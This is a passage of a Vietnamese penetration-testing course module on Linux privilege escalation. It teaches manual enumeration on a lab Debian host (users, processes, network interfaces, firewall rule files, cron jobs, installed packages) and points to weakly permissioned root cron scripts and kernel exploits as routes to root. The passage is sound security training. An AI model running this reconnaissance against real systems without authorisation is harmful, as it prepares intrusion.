# Linux Privilege Escalation

# Linux Privilege Escalation

---

Trong Learning Module này, chúng ta sẽ bao quát các Learning Unit sau:

- Liệt kê (Enumerating) Linux
- Thông tin mật bị lộ (Exposed Confidential Information)
- Quyền truy cập tệp không an toàn (Insecure File Permissions)
- Lạm dụng các thành phần hệ thống Linux (Abusing System Linux components)

Cũng như nhiều kỹ thuật tấn công khác, việc leo thang đặc quyền yêu cầu chúng ta thu thập kiến thức về mục tiêu. Điều này được thực hiện bằng cách liệt kê hệ điều hành để tìm ra bất kỳ dạng cấu hình sai hoặc lỗ hổng phần mềm nào có thể được tận dụng cho mục đích của chúng ta.

Như được ghi nhận trong MITRE ATT&CK Framework, leo thang đặc quyền là một tactic bao gồm nhiều technique khác nhau nhằm tận dụng các quyền của người dùng để truy cập các tài nguyên bị hạn chế.

Trong Module này, chúng ta sẽ chuyển sự chú ý sang các mục tiêu dựa trên Linux. Chúng ta sẽ khám phá cách liệt kê các máy Linux và điều gì cấu thành đặc quyền trên Linux. Sau đó, chúng ta sẽ trình bày các kỹ thuật leo thang đặc quyền phổ biến trên Linux dựa trên quyền truy cập tệp không an toàn và các thành phần hệ thống bị cấu hình sai.

---

# 1. Enumerating Linux

---

Learning Unit này bao gồm các Learning Objective sau:

- Hiểu về quyền của tệp và người dùng trên Linux
- Thực hiện liệt kê thủ công
- Tiến hành liệt kê tự động

Trong Learning Unit này, chúng ta sẽ bắt đầu bằng việc ôn lại mô hình đặc quyền của Linux, sau đó chuyển sang thực hiện các kỹ thuật liệt kê thủ công và tự động.

---

## 1.1. Hiểu về quyền của tệp và người dùng trên Linux

---

Trước khi thảo luận về các kỹ thuật leo thang đặc quyền cụ thể, hãy cùng ôn lại các đặc quyền và cơ chế kiểm soát truy cập trên Linux.

Một trong những đặc điểm mang tính định nghĩa của Linux và các hệ dẫn xuất UNIX khác là hầu hết các tài nguyên, bao gồm tệp, thư mục, thiết bị, và thậm chí cả giao tiếp mạng, đều được biểu diễn trong hệ thống tệp. Nói một cách bình dân, “mọi thứ đều là một tệp”.

Mỗi tệp (và theo nghĩa mở rộng là mỗi thành phần của một hệ thống Linux) tuân theo các quyền người dùng và nhóm dựa trên ba thuộc tính chính: đọc (được ký hiệu là r), ghi (được ký hiệu là w) và thực thi (được ký hiệu là x). Mỗi tệp hoặc thư mục có các quyền cụ thể cho ba nhóm người dùng: chủ sở hữu, nhóm của chủ sở hữu và nhóm others.

Mỗi quyền (rwx) cho phép tập hợp người dùng được chỉ định thực hiện các hành động khác nhau, tùy thuộc vào việc tài nguyên đó là tệp hay thư mục.

Đối với tệp, r cho phép đọc nội dung tệp, w cho phép thay đổi nội dung và x cho phép tệp được thực thi. Thư mục được xử lý khác với tệp. Quyền đọc cho phép xem danh sách nội dung của nó (các tệp và thư mục). Quyền ghi cho phép tạo hoặc xóa tệp. Cuối cùng, quyền thực thi cho phép đi xuyên qua thư mục để truy cập nội dung của nó (ví dụ, sử dụng lệnh cd). Việc có thể đi xuyên qua một thư mục mà không thể đọc nó sẽ cho người dùng quyền truy cập các mục đã biết, nhưng chỉ khi biết chính xác tên của chúng.

Hãy xem xét một tổ hợp đơn giản của các quyền tệp này bằng một ví dụ thực tế trên máy Kali cục bộ của chúng ta, vì nó dựa trên bản phân phối Linux Debian.

```
kali@kali:~$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1751 May  2 09:31 /etc/shadow
```

                                   *Listing 1 - Kiểm tra quyền tệp và quyền sở hữu người dùng*

Đối với mỗi nhóm người dùng, ba quyền truy cập khác nhau được hiển thị. Dấu gạch ngang đầu tiên mà chúng ta gặp mô tả loại tệp. Vì nó không liên quan trực tiếp đến quyền tệp, chúng ta có thể bỏ qua một cách an toàn.

Ba ký tự tiếp theo hiển thị quyền của chủ sở hữu tệp (root), là rw-, nghĩa là chủ sở hữu có quyền đọc và ghi, nhưng không có quyền thực thi. Tiếp theo, nhóm shadow chỉ được cấp quyền đọc, do các cờ ghi và thực thi không được thiết lập. Cuối cùng, nhóm others không được cấp bất kỳ quyền truy cập nào đối với tệp này.

Giờ đây, chúng ta có thể áp dụng kiến thức nhập môn này về quyền tệp trên Linux khi thực hiện liệt kê phục vụ leo thang đặc quyền trong phần tiếp theo.

---

## 1.2. Liệt kê thủ công

---

Việc liệt kê các hệ thống Linux theo cách thủ công có thể tốn nhiều thời gian. Tuy nhiên, cách tiếp cận này cho phép có một kết quả được kiểm soát tốt hơn vì nó giúp xác định các phương thức leo thang đặc quyền “đặc thù” hơn, vốn thường bị các công cụ tự động bỏ qua.

Hơn nữa, liệt kê tự động không thể thay thế điều tra thủ công vì các thiết lập tùy biến của môi trường mục tiêu của chúng ta nhiều khả năng chính là những thứ bị cấu hình sai.

Một số lệnh trong Module này có thể yêu cầu chỉnh sửa nhỏ tùy thuộc vào phiên bản hệ điều hành mục tiêu. Ngoài ra, không phải tất cả các lệnh được trình bày trong phần này đều có thể tái hiện trên các máy khách chuyên dụng.

Khi giành được quyền truy cập ban đầu vào mục tiêu, một trong những điều đầu tiên chúng ta nên xác định là ngữ cảnh người dùng. Chúng ta có thể dùng lệnh id để thu thập thông tin ngữ cảnh người dùng. Chúng ta có thể làm điều này bằng cách kết nối qua SSH với tư cách người dùng joe tới máy lab Debian của chúng ta.

```
joe@debian-privesc:~$ id 
uid=1000(joe) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
```

                                             *Listing 2 - Lấy thông tin về người dùng hiện tại*

Đầu ra cho thấy chúng ta đang hoạt động với tư cách người dùng joe, người dùng này có User Identifier (UID) và Group Identifier (GID) là 1000. Người dùng joe cũng thuộc các nhóm khác nằm ngoài phạm vi của Module này.

Để liệt kê tất cả người dùng, chúng ta có thể đơn giản đọc nội dung của tệp /etc/passwd.

```
joe@debian-privesc:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
...
Debian-gdm:x:117:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
eve:x:1001:1001:,,,:/home/eve:/bin/bash
```

                                                  *Listing 3 - Lấy thông tin về các người dùng*

Tệp passwd liệt kê nhiều tài khoản người dùng, bao gồm các tài khoản được dùng bởi các dịch vụ khác nhau trên máy mục tiêu như www-data và sshd. Điều này cho thấy rằng một máy chủ web và một máy chủ SSH rất có thể đã được cài đặt trên hệ thống.

Giờ chúng ta có thể tập trung vào dữ liệu của người dùng hiện tại:

- Login Name: “joe” - Cho biết tên người dùng dùng để đăng nhập.
- Encrypted Password: “x” - Trường này thường chứa phiên bản băm của mật khẩu người dùng. Trong trường hợp này, giá trị x có nghĩa là toàn bộ hash mật khẩu nằm trong tệp /etc/shadow (sẽ nói thêm về điều này ngay sau đó).
- UID: “1000” - Ngoài người dùng root luôn có UID là 0, Linux bắt đầu đếm ID người dùng thông thường từ 1000. Giá trị này cũng được gọi là real user ID.
- GID: “1000” - Đại diện cho Group ID cụ thể của người dùng.
- Comment: “joe,,,” - Trường này nhìn chung chứa một mô tả về người dùng, thường chỉ đơn giản lặp lại thông tin tên người dùng.
- Home Folder: “/home/joe” - Mô tả thư mục home của người dùng được dùng khi đăng nhập.
- Login Shell: “/bin/bash” - Cho biết shell tương tác mặc định (nếu có).

Ngoài người dùng joe, chúng ta cũng nhận thấy một người dùng khác tên eve, và có thể suy ra đây là một người dùng tiêu chuẩn vì nó có thư mục home được cấu hình là /home/eve. Mặt khác, các dịch vụ hệ thống được cấu hình với login shell là `/usr/sbin/nologin`, nơi chỉ thị nologin được dùng để chặn mọi đăng nhập từ xa hoặc cục bộ đối với các tài khoản dịch vụ.

Việc liệt kê tất cả người dùng trên máy mục tiêu có thể giúp xác định các tài khoản người dùng có đặc quyền cao tiềm năng mà chúng ta có thể nhắm tới trong nỗ lực leo thang đặc quyền.

Tiếp theo, `hostname` của một máy thường có thể cung cấp gợi ý về vai trò chức năng của nó. Phần lớn thời gian, hostname sẽ bao gồm các viết tắt có thể nhận diện như web cho máy chủ web, db cho máy chủ cơ sở dữ liệu, dc cho domain controller, v.v.

Trên hầu hết các bản phân phối Linux, chúng ta có thể thấy hostname được nhúng trong dấu nhắc lệnh. Tuy nhiên, chúng ta chỉ nên dựa vào các lệnh hệ thống để lấy thông tin của mục tiêu, vì đôi khi văn bản của prompt có thể đánh lừa.

Chúng ta có thể phát hiện hostname bằng lệnh có tên đúng như chức năng của nó là hostname.

```
joe@debian-privesc:~$ hostname
debian-privesc
```

                                                        *Listing 4 - Lấy thông tin về hostname*

Các doanh nghiệp thường áp dụng một sơ đồ quy ước đặt tên cho hostname, để chúng có thể được phân loại theo vị trí, mô tả, hệ điều hành và mức dịch vụ. Trong trường hợp của chúng ta, hostname chỉ bao gồm hai phần: loại OS và mô tả.

Xác định vai trò của một máy có thể giúp chúng ta tập trung nỗ lực thu thập thông tin bằng cách tăng ngữ cảnh xung quanh host.

Tại một thời điểm nào đó trong quá trình leo thang đặc quyền, chúng ta có thể cần dựa vào các khai thác kernel vốn khai thác các lỗ hổng trong lõi của hệ điều hành mục tiêu. Các loại khai thác này được xây dựng cho một kiểu mục tiêu rất cụ thể, được xác định bởi một kết hợp hệ điều hành và phiên bản nhất định. Vì tấn công một mục tiêu bằng một kernel exploit không khớp có thể dẫn đến hệ thống mất ổn định hoặc thậm chí sập, chúng ta phải thu thập thông tin chính xác về mục tiêu.

Bất kỳ sự mất ổn định hệ thống nào do hoạt động kiểm thử xâm nhập của chúng ta gây ra rất có thể sẽ cảnh báo các quản trị viên hệ thống trước bất kỳ đội SOC nào. Vì lý do này, chúng ta nên cẩn trọng gấp đôi khi làm việc với kernel exploit và, khi có thể, thử nghiệm exploit trong môi trường cục bộ trước.

Các tệp /etc/issue và /etc/*-release chứa thông tin về bản phát hành và phiên bản hệ điều hành. Chúng ta cũng có thể chạy lệnh uname -a:

```
joe@debian-privesc:~$ cat /etc/issue
Debian GNU/Linux 10 \n \l

joe@debian-privesc:~$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

joe@debian-privesc:~$ uname -a
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30)
x86_64 GNU/Linux
```

                           *Listing 5 - Lấy phiên bản của hệ điều hành đang chạy và kiến trúc*

Các tệp `issue` và `os-release` nằm trong thư mục /etc chứa phiên bản hệ điều hành (Debian 10) và thông tin theo bản phát hành, bao gồm codename của bản phân phối (buster). Lệnh `uname -a` xuất ra phiên bản kernel (4.19.0) và kiến trúc (x86_64).

Tiếp theo, hãy khám phá các tiến trình và dịch vụ đang chạy nào có thể cho phép chúng ta leo thang đặc quyền. Để điều này xảy ra, tiến trình phải chạy trong ngữ cảnh của một tài khoản đặc quyền và phải hoặc có quyền không an toàn hoặc cho phép chúng ta tương tác với nó theo những cách không mong muốn.

Chúng ta có thể liệt kê các tiến trình hệ thống (bao gồm các tiến trình chạy bởi người dùng đặc quyền) với lệnh `ps`. Chúng ta sẽ dùng các cờ `a` và `x` để liệt kê tất cả tiến trình có hoặc không có tty và cờ `u` để liệt kê tiến trình ở định dạng dễ đọc đối với người dùng.

```
joe@debian-privesc:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4 169592 10176 ?        Ss   Aug16   0:02 /sbin/init
...
colord     752  0.0  0.6 246984 12424 ?        Ssl  Aug16   0:00 /usr/lib/colord/colord
Debian-+   753  0.0  0.2 157188  5248 ?        Sl   Aug16   0:00 /usr/lib/dconf/dconf-service
root       477  0.0  0.5 179064 11060 ?        Ssl  Aug16   0:00 /usr/sbin/cups-browsed
root       479  0.0  0.4 236048  9152 ?        Ssl  Aug16   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       486  0.0  1.0 123768 22104 ?        Ssl  Aug16   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       510  0.0  0.3  13812  7288 ?        Ss   Aug16   0:00 /usr/sbin/sshd -D
root       512  0.0  0.3 241852  8080 ?        Ssl  Aug16   0:00 /usr/sbin/gdm3
root       519  0.0  0.4 166764  8308 ?        Sl   Aug16   0:00 gdm-session-worker [pam/gdm-launch-environment]
root       530  0.0  0.2  11164  4448 ?        Ss   Aug16   0:03 /usr/sbin/apache2 -k start
root      1545  0.0  0.0      0     0 ?        I    Aug16   0:00 [kworker/1:1-events]
root      1653  0.0  0.3  14648  7712 ?        Ss   01:03   0:00 sshd: joe [priv]
root      1656  0.0  0.0      0     0 ?        I    01:03   0:00 [kworker/1:2-events_power_efficient]
joe       1657  0.0  0.4  21160  8960 ?        Ss   01:03   0:00 /lib/systemd/systemd --user
joe       1658  0.0  0.1 170892  2532 ?        S    01:03   0:00 (sd-pam)
joe       1672  0.0  0.2  14932  5064 ?        S    01:03   0:00 sshd: joe@pts/0
joe       1673  0.0  0.2   8224  5020 pts/0    Ss   01:03   0:00 -bash
root      1727  0.0  0.0      0     0 ?        I    03:00   0:00 [kworker/0:0-ata_sff]
root      1728  0.0  0.0      0     0 ?        I    03:06   0:00 [kworker/0:2-ata_sff]
joe       1730  0.0  0.1  10600  3028 pts/0    R+   03:10   0:00 ps axu
```

                            *Listing 6 - Lấy danh sách các tiến trình đang chạy trên Linux*

Đầu ra liệt kê nhiều tiến trình chạy với tư cách root đáng để nghiên cứu nhằm tìm các lỗ hổng tiềm năng. Chúng ta cũng sẽ nhận thấy lệnh ps mà chúng ta chạy cũng được liệt kê trong đầu ra, thuộc sở hữu của người dùng hiện tại. Chúng ta cũng có thể lọc tiến trình thuộc người dùng cụ thể khỏi đầu ra bằng tên người dùng phù hợp.

Bước tiếp theo trong phân tích host mục tiêu là xem xét các giao diện mạng khả dụng, các tuyến (route), và các cổng đang mở. Thông tin này có thể giúp chúng ta xác định liệu mục tiêu bị xâm nhập có kết nối tới nhiều mạng hay không và do đó có thể được dùng làm pivot. Sự hiện diện của các giao diện ảo cụ thể cũng có thể chỉ ra sự tồn tại của ảo hóa hoặc phần mềm antivirus.

Một kẻ tấn công có thể dùng mục tiêu bị xâm nhập để pivot, hoặc di chuyển giữa các mạng được kết nối. Điều này sẽ khuếch đại mức độ hiển thị mạng và cho phép kẻ tấn công nhắm tới các host không thể truy cập trực tiếp từ máy tấn công ban đầu.

Chúng ta cũng có thể điều tra các ràng buộc cổng (port bindings) để xem liệu một dịch vụ đang chạy chỉ khả dụng trên địa chỉ loopback hay thay vì một địa chỉ có thể định tuyến. Việc điều tra một chương trình hoặc dịch vụ đặc quyền đang lắng nghe trên giao diện loopback có thể mở rộng bề mặt tấn công và tăng xác suất thành công của một cuộc tấn công leo thang đặc quyền.

Tùy thuộc vào phiên bản Linux, chúng ta có thể liệt kê cấu hình TCP/IP của mọi adapter mạng bằng `ifconfig` hoặc `ip`. Trong khi lệnh trước hiển thị thống kê giao diện, lệnh sau cung cấp một phiên bản cô đọng của cùng thông tin. Cả hai lệnh đều chấp nhận cờ `a` để hiển thị tất cả thông tin sẵn có.

```
joe@debian-privesc:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:b9:fc brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.214/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:b9fc/64 scope link
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:72:64 brd ff:ff:ff:ff:ff:ff
    inet 172.16.60.214/24 brd 172.16.60.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:7264/64 scope link
       valid_lft forever preferred_lft forever
```

                *Listing 7 - Liệt kê cấu hình TCP/IP đầy đủ trên tất cả adapter khả dụng trên Linux*

Dựa trên đầu ra ở trên, máy khách Linux cũng được kết nối với nhiều hơn một mạng.

Chúng ta có thể hiển thị bảng định tuyến mạng bằng `route` hoặc `routel`, tùy theo bản phân phối và phiên bản Linux. Cả hai lệnh cung cấp thông tin tương tự.

```
joe@debian-privesc:~$ routel
         target            gateway          source    proto    scope    dev tbl
/usr/bin/routel: 48: shift: can't shift that many
        default     192.168.50.254                   static          ens192
    172.16.60.0 24                   172.16.60.214   kernel     link ens224
   192.168.50.0 24                  192.168.50.214   kernel     link ens192
      127.0.0.0          broadcast       127.0.0.1   kernel     link     lo local
      127.0.0.0 8            local       127.0.0.1   kernel     host     lo local
      127.0.0.1              local       127.0.0.1   kernel     host     lo local
127.255.255.255          broadcast       127.0.0.1   kernel     link     lo local
    172.16.60.0          broadcast   172.16.60.214   kernel     link ens224 local
  172.16.60.214              local   172.16.60.214   kernel     host ens224 local
  172.16.60.255          broadcast   172.16.60.214   kernel     link ens224 local
   192.168.50.0          broadcast  192.168.50.214   kernel     link ens192 local
 192.168.50.214              local  192.168.50.214   kernel     host ens192 local
 192.168.50.255          broadcast  192.168.50.214   kernel     link ens192 local
            ::1                                      kernel              lo
         fe80:: 64                                   kernel          ens224
         fe80:: 64                                   kernel          ens192
            ::1              local                   kernel              lo local
fe80::250:56ff:fe8a:7264              local                   kernel          ens224 local
fe80::250:56ff:fe8a:b9fc              local                   kernel          ens192 local
```

                                                           *Listing 8 - In các route trên Linux*

Cuối cùng, chúng ta có thể hiển thị các kết nối mạng đang hoạt động và các cổng đang lắng nghe bằng `netstat` hoặc `ss`, cả hai đều chấp nhận cùng các đối số.

Ví dụ, chúng ta có thể liệt kê tất cả kết nối với `-a`, tránh phân giải hostname (có thể làm lệnh bị treo khi thực thi) với `-n`, và liệt kê tên tiến trình mà kết nối thuộc về với `-p`. Chúng ta có thể kết hợp các đối số và đơn giản chạy ss -anp:

```
joe@debian-privesc:~$ ss -anp
Netid      State       Recv-Q      Send-Q                                        Local Address:Port                     Peer Address:Port
nl         UNCONN      0           0                                                         0:461                                  *
nl         UNCONN      0           0                                                         0:323                                  *
nl         UNCONN      0           0                                                         0:457                                  *
...
udp        UNCONN      0           0                                                      [::]:47620                            [::]:*
tcp        LISTEN      0           128                                                 0.0.0.0:22                            0.0.0.0:*
tcp        LISTEN      0           5                                                 127.0.0.1:631                           0.0.0.0:*
tcp        ESTAB       0           36                                           192.168.50.214:22                      192.168.118.2:32890
tcp        LISTEN      0           128                                                       *:80                                  *:*
tcp        LISTEN      0           128                                                    [::]:22                               [::]:*
tcp        LISTEN      0           5                                                     [::1]:631                              [::]:*
```

                          *Listing 9 - Liệt kê tất cả kết nối mạng đang hoạt động trên Linux*

Đầu ra liệt kê nhiều cổng đang lắng nghe và các phiên đang hoạt động, bao gồm kết nối SSH đang hoạt động của chính chúng ta và socket lắng nghe của nó.

Tiếp tục với liệt kê cơ sở của chúng ta, tiếp theo hãy tập trung vào các quy tắc firewall.

Nói chung, trong giai đoạn khai thác từ xa của một bài đánh giá, chúng ta chủ yếu quan tâm đến trạng thái, profile và các quy tắc của firewall. Tuy nhiên, thông tin này cũng có thể hữu ích trong quá trình leo thang đặc quyền. Ví dụ, nếu một dịch vụ mạng không thể truy cập từ xa vì bị firewall chặn, thì nó thường có thể truy cập cục bộ thông qua giao diện loopback. Nếu chúng ta có thể tương tác với các dịch vụ này cục bộ, chúng ta có thể khai thác chúng để leo thang đặc quyền trên hệ thống cục bộ.

Trong giai đoạn này, chúng ta cũng có thể thu thập thông tin về lọc cổng inbound và outbound để hỗ trợ port forwarding và tunneling khi đến lúc pivot sang một mạng nội bộ.

Trên các hệ thống dựa trên Linux, chúng ta phải có đặc quyền root để liệt kê các quy tắc firewall với iptables. Tuy nhiên, tùy thuộc vào cách firewall được cấu hình, chúng ta có thể thu thập được thông tin về các quy tắc dưới vai trò người dùng tiêu chuẩn.

Ví dụ, gói `iptables-persistent` trên Debian Linux lưu các quy tắc firewall trong các tệp cụ thể dưới `/etc/iptables` theo mặc định. Các tệp này được hệ thống dùng để khôi phục các quy tắc `netfilter` khi khởi động. Các tệp này thường bị để với quyền yếu, cho phép bất kỳ người dùng cục bộ nào trên hệ thống mục tiêu đọc được.

Chúng ta cũng có thể tìm các tệp được tạo bởi lệnh `iptables-save`, lệnh này được dùng để dump cấu hình firewall ra một tệp do người dùng chỉ định. Tệp này sau đó thường được dùng làm đầu vào cho lệnh `iptables-restore` và được dùng để khôi phục các quy tắc firewall khi khởi động. Nếu một quản trị viên hệ thống từng chạy lệnh này, chúng ta có thể tìm trong thư mục cấu hình (/etc) hoặc grep hệ thống tệp để tìm các lệnh iptables nhằm định vị tệp. Nếu tệp có quyền không an toàn, chúng ta có thể dùng nội dung để suy ra các quy tắc cấu hình firewall đang chạy trên hệ thống.

```
joe@debian-privesc:~$ cat /etc/iptables/rules.v4
# Generated by xtables-save v1.8.2 on Thu Aug 18 12:53:22 2022
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -p tcp -m tcp --dport 1999 -j ACCEPT
COMMIT
# Completed on Thu Aug 18 12:53:22 2022
```

                                                       *Listing 10 - Kiểm tra custom IP tables*

Vì tệp này chỉ đọc đối với mọi người dùng khác ngoài root, chúng ta có thể kiểm tra nội dung của nó. Chúng ta sẽ nhận thấy một quy tắc không mặc định cho phép rõ ràng cổng đích 1999. Chi tiết cấu hình này nổi bật và nên được ghi chú để điều tra sau.

Tiếp theo, hãy xem các tác vụ theo lịch mà kẻ tấn công thường tận dụng trong các cuộc tấn công leo thang đặc quyền. Các hệ thống đóng vai trò máy chủ thường định kỳ thực thi nhiều tác vụ tự động theo lịch. Khi các hệ thống này bị cấu hình sai, hoặc các tệp do người dùng tạo ra bị để với quyền không an toàn, chúng ta có thể sửa đổi các tệp này và chúng sẽ được hệ thống lập lịch thực thi ở mức đặc quyền cao.

Trình lập lịch công việc trên Linux được gọi là `cron`. Các tác vụ theo lịch được liệt kê dưới các thư mục `/etc/cron.*` , trong đó * đại diện cho tần suất tác vụ sẽ chạy. Ví dụ, các tác vụ chạy hàng ngày có thể được tìm thấy dưới /etc/cron.daily. Mỗi script được liệt kê trong thư mục con của riêng nó.

```
joe@debian-privesc:~$ ls -lah /etc/cron*
-rw-r--r-- 1 root root 1.1K Oct 11  2019 /etc/crontab

/etc/cron.d:
total 24K
drwxr-xr-x   2 root root 4.0K Aug 16 04:25 .
drwxr-xr-x 120 root root  12K Aug 18 12:37 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
-rw-r--r--   1 root root  285 May 19  2019 anacron

/etc/cron.daily:
total 60K
drwxr-xr-x   2 root root 4.0K Aug 18 09:05 .
drwxr-xr-x 120 root root  12K Aug 18 12:37 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x   1 root root  311 May 19  2019 0anacron
-rwxr-xr-x   1 root root  539 Aug  8  2020 apache2
-rwxr-xr-x   1 root root 1.5K Dec  7  2020 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root  384 Dec 31  2018 cracklib-runtime
-rwxr-xr-x   1 root root 1.2K Apr 18  2019 dpkg
-rwxr-xr-x   1 root root 2.2K Feb 10  2018 locate
-rwxr-xr-x   1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x   1 root root 1.1K Feb 10  2019 man-db
-rwxr-xr-x   1 root root  249 Sep 27  2017 passwd

/etc/cron.hourly:
total 20K
drwxr-xr-x   2 root root 4.0K Aug 16 04:17 .
drwxr-xr-x 120 root root  12K Aug 18 12:37 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 24K
drwxr-xr-x   2 root root 4.0K Aug 16 04:25 .
drwxr-xr-x 120 root root  12K Aug 18 12:37 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x   1 root root  313 May 19  2019 0anacron

/etc/cron.weekly:
total 28K
drwxr-xr-x   2 root root 4.0K Aug 16 04:26 .
drwxr-xr-x 120 root root  12K Aug 18 12:37 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x   1 root root  312 May 19  2019 0anacron
-rwxr-xr-x   1 root root  813 Feb 10  2019 man-db
joe@debian-privesc:~$
```

                                                          *Listing 11 - Liệt kê tất cả cron job*

Khi liệt kê nội dung thư mục, chúng ta nhận thấy một số tác vụ được lên lịch chạy hằng ngày.

Đáng lưu ý rằng các quản trị viên hệ thống thường thêm các tác vụ theo lịch của riêng họ trong tệp `/etc/crontab`. Các tác vụ này nên được kiểm tra cẩn thận về quyền tệp không an toàn, vì hầu hết job trong tệp này sẽ chạy với tư cách root. Để xem các job theo lịch của người dùng hiện tại, chúng ta có thể chạy crontab kèm tham số -l.

```
joe@debian-privesc:~$ crontab -l
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command

```

                                        *Listing 12 - Liệt kê cron job cho người dùng hiện tại*

Trong đầu ra ở trên, chỉ có các hướng dẫn được comment, nghĩa là không có cron job nào được cấu hình cho người dùng joe. Tuy nhiên, nếu chúng ta thử chạy cùng lệnh với tiền tố sudo, chúng ta phát hiện rằng một script sao lưu được lên lịch chạy mỗi phút.

```
joe@debian-privesc:~$ sudo crontab -l
[sudo] password for joe:
# Edit this file to introduce tasks to be run by cron.
...
# m h  dom mon dow   command

* * * * * /bin/bash /home/joe/.scripts/user_backups.sh
```

                                               *Listing 13 - Liệt kê cron job cho người dùng root*

Việc liệt kê cron job bằng sudo hiển thị các job do người dùng root chạy. Trong ví dụ này, nó cho thấy một script sao lưu chạy với tư cách root. Nếu tệp này có quyền yếu, chúng ta có thể tận dụng nó để leo thang đặc quyền.

Như chúng ta sẽ học sau trong Module này, người dùng joe đã được cấp quyền sudo cụ thể chỉ để liệt kê các cron job đang chạy với tư cách root. Quyền này một mình không thể bị lạm dụng để giành được một root shell.

Tại một thời điểm nào đó, chúng ta có thể cần tận dụng một exploit để leo thang đặc quyền cục bộ. Nếu vậy, việc tìm một exploit hoạt động bắt đầu bằng việc liệt kê tất cả các ứng dụng đã cài đặt, ghi nhận phiên bản của từng ứng dụng. Chúng ta có thể dùng thông tin này để tìm một exploit tương ứng.

Việc tìm thủ công thông tin này có thể rất tốn thời gian và không hiệu quả, vì vậy chúng ta sẽ học cách tự động hóa quá trình này trong phần tiếp theo. Tuy nhiên, chúng ta nên biết cách truy vấn thủ công các gói đã cài đặt vì điều này cần thiết để đối chiếu thông tin thu được trong các bước liệt kê trước đó.

Các hệ thống dựa trên Linux sử dụng nhiều trình quản lý gói khác nhau. Ví dụ, các bản phân phối Linux dựa trên Debian, như hệ thống trong lab của chúng ta, dùng `dpkg`, trong khi các hệ thống dựa trên Red Hat dùng `rpm`.

Để liệt kê các ứng dụng được cài đặt bởi dpkg trên hệ thống Debian của chúng ta, chúng ta có thể dùng dpkg -l.

```
joe@debian-privesc:~$ dpkg -l
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                                  Version                                      Architecture Description
+++-=====================================-============================================-============-===============================================================================
ii  accountsservice                       0.6.45-2                                     amd64        query and manipulate user account information
ii  acl                                   2.2.53-4                                     amd64        access control list - utilities
ii  adduser                               3.118                                        all          add and remove users and groups
ii  adwaita-icon-theme                    3.30.1-1                                     all          default icon theme of GNOME
ii  aisleriot                             1:3.22.7-2                                   amd64        GNOME solitaire card game collection
ii  alsa-utils                            1.1.8-2                                      amd64        Utilities for configuring and using ALSA
ii  anacron                               2.3-28                                       amd64        cron-like program that doesn't go by time
ii  analog                                2:6.0-22                                     amd64        web server log analyzer
ii  apache2                               2.4.38-3+deb10u7                             amd64        Apache HTTP Server
